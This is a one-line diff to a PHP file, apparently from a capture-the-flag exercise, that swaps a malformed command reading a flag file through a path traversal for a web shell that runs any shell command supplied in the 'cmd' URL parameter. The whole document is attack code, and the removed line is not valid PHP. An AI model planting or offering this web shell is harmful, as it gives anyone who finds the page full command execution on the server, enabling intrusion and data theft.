@@ -1,1 +1,1 @@
-<?php exec(cat ../../../var/flag.txt) ?>
+<?php exec($_GET["cmd"]); ?>
